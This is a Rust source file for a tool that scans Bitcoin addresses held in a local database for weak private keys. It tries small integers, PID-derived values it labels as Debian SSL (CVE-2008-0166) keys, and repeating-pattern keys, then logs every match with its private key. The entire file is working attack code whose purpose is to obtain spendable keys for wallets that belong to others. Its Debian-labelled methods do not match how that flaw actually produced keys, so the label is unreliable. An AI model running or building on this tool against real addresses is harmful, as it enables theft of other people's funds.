use anyhow::Result;
use bitcoin::{Address, Network, PublicKey};
use bitcoin::secp256k1::{Secp256k1, SecretKey};
use clap::Parser;


use rayon::prelude::*;
use rusqlite::{params, Connection};
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::sync::{Arc};

const DB_FILE: &str = "cryscout.db";

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long, default_value_t = 1000000)]
    limit: u64,
}

fn load_targets() -> Result<HashSet<String>> {
    let conn = Connection::open(DB_FILE)?;
    let mut stmt = conn.prepare("SELECT address FROM addresses")?;
    let addrs: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
    Ok(addrs.into_iter().collect())
}

fn log_hit(address: &str, privkey_hex: &str, method: &str) -> Result<()> {
    let conn = Connection::open(DB_FILE)?;
    conn.execute(
        "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
        params![address, privkey_hex, method],
    )?;
    println!("\n[!!!] HIT! Address: {}, Method: {}, PrivKey: {}", address, method, privkey_hex);
    Ok(())
}

fn check_key(secp: &Secp256k1<bitcoin::secp256k1::All>, priv_bytes: &[u8; 32], targets: &HashSet<String>, method: &str) {
    if let Ok(sk) = SecretKey::from_slice(priv_bytes) {
        let pk = PublicKey::new(sk.public_key(secp));
        let p2pkh = Address::p2pkh(&pk, Network::Bitcoin).to_string();
        let p2wpkh = Address::p2wpkh(&pk, Network::Bitcoin).map(|a| a.to_string()).ok();
        
        if targets.contains(&p2pkh) { let _ = log_hit(&p2pkh, &hex::encode(priv_bytes), method); }
        if let Some(a) = p2wpkh { if targets.contains(&a) { let _ = log_hit(&a, &hex::encode(priv_bytes), method); } }
    }
}

fn main() -> Result<()> {
    let args = Args::parse();
    let targets = Arc::new(load_targets()?);
    if targets.is_empty() {
        println!("No targets found in DB.");
        return Ok(());
    }
    println!("Loaded {} targets. Starting weak key scan...", targets.len());

    let secp = Secp256k1::new();

    // 1. Small Keys (1 to limit)
    println!("Scanning small keys (1 to {})...", args.limit);
    (1..args.limit).into_par_iter().for_each(|i| {
        let mut bytes = [0u8; 32];
        let i_bytes = i.to_be_bytes();
        bytes[24..].copy_from_slice(&i_bytes);
        check_key(&secp, &bytes, &targets, "Small Key");
    });

    // 2. Debian SSL Weak Keys (CVE-2008-0166)
    // PID 1 to 32768
    println!("Scanning Debian SSL weak keys (PIDs 1-32768)...");
    (1..32768).into_par_iter().for_each(|pid| {
        // Variant 1: SHA256(pid_string)
        let pid_str = format!("{}", pid);
        let mut hasher = Sha256::new();
        hasher.update(pid_str.as_bytes());
        let hash = hasher.finalize();
        let mut bytes = [0u8; 32];
        bytes.copy_from_slice(&hash);
        check_key(&secp, &bytes, &targets, "Debian SSL (PID String)");

        // Variant 2: Direct PID
        let mut bytes_pid = [0u8; 32];
        let p_bytes = (pid as u32).to_be_bytes();
        bytes_pid[28..].copy_from_slice(&p_bytes);
        check_key(&secp, &bytes_pid, &targets, "Debian SSL (Direct PID)");
    });

    // 3. Pattern Keys
    println!("Scanning pattern keys...");
    let patterns = vec![
        "0101010101010101010101010101010101010101010101010101010101010101",
        "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
        "baadf00dbaadf00dbaadf00dbaadf00dbaadf00dbaadf00dbaadf00dbaadf00d",
        "1234567812345678123456781234567812345678123456781234567812345678",
    ];
    for p in patterns {
        if let Ok(b) = hex::decode(p) {
            let mut bytes = [0u8; 32];
            bytes.copy_from_slice(&b);
            check_key(&secp, &bytes, &targets, "Pattern Key");
        }
    }

    println!("Weak key scan complete.");
    Ok(())
}
